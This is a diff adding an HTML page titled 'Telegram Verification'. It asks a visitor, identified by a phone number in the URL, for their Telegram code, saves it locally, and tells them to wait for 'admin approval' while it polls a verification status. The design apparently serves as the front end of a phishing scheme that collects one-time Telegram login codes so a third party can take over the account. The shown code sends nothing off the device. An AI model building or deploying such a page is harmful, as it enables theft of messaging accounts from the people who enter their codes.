@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Telegram Verification</title>
+<link rel="icon" type= "image/png" href="logo.png">
+
+<style>
+body { font-family: Arial,sans-serif; background:#0f1724; color:#fff; display:flex; align-items:center; justify-content:center; height:100vh; }
+.container { background:#1e293b; padding:25px; border-radius:12px; width:340px; box-shadow:0 0 25px rgba(0,0,0,0.5); }
+h2 { text-align:center; }
+label { display:block; margin-top:12px; }
+input { width:100%; padding:10px; margin-top:5px; border:none; border-radius:6px; background:#334155; color:#fff; }
+button { width:100%; margin-top:18px; padding:10px; border:none; border-radius:6px; background:#06b6d4; color:#012; font-weight:bold; cursor:pointer; }
+button:hover { background:#0891b2; }
+#msg { text-align:center; margin-top:10px; font-size:14px; }
+#status { text-align:center; margin-top:12px; font-size:16px; font-weight:bold; }
+.verified { color:#22c55e; }
+.rejected { color:#ef4444; }
+.pending { color:#fbbf24; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <form id="telegramForm">
+    <h2>Telegram Verification</h2>
+    <p style="text-align:center;font-size:14px;">Enter your Telegram code</p>
+    <input type="text" id="telegramCode" placeholder="Enter code (any length)" required>
+    <button type="submit">Submit Code</button>
+    <div id="msg"></div>
+    <div id="status"></div>
+  </form>
+</div>
+
+<script>
+const urlParams = new URLSearchParams(window.location.search);
+const phone = urlParams.get("phone");
+
+const telegramForm = document.getElementById("telegramForm");
+const msg = document.getElementById("msg");
+const statusDiv = document.getElementById("status");
+
+// Load current status for this user
+function updateStatusDisplay(){
+  const users = JSON.parse(localStorage.getItem("users")||"[]");
+  const user = users.find(u=>u.phone===phone);
+  if(!user) return;
+  
+  if(user.status === "Pending"){
+    statusDiv.textContent = "Status: Pending";
+    statusDiv.className = "pending";
+  } else if(user.status === "Verified"){
+    statusDiv.textContent = "Status: Verified ✅";
+    statusDiv.className = "verified";
+  } else if(user.status === "Rejected"){
+    statusDiv.textContent = "Status: Rejected ❌, please enter correct  phone number or telegram code";
+    statusDiv.className = "rejected";
+  }
+}
+updateStatusDisplay();
+
+telegramForm.addEventListener("submit", e=>{
+  e.preventDefault();
+  const code = document.getElementById("telegramCode").value.trim();
+  if(!code){
+    msg.textContent = "Code cannot be empty."; 
+    msg.style.color="#ef4444"; 
+    return;
+  }
+
+  const users = JSON.parse(localStorage.getItem("users") || "[]");
+  const index = users.findIndex(u=>u.phone===phone);
+  if(index!==-1){ 
+    users[index].telegramCode=code; 
+    localStorage.setItem("users",JSON.stringify(users)); 
+  }
+
+  msg.textContent = "✅ Telegram code submitted! Wait for admin approval."; 
+  msg.style.color="#22c55e";
+  telegramForm.querySelector("button").disabled = true;
+
+  // Refresh status display in case admin already verified/rejected
+  updateStatusDisplay();
+});
+
+// Optional: check periodically if admin updates status
+setInterval(updateStatusDisplay, 2000);
+</script>
+</body>
+</html>
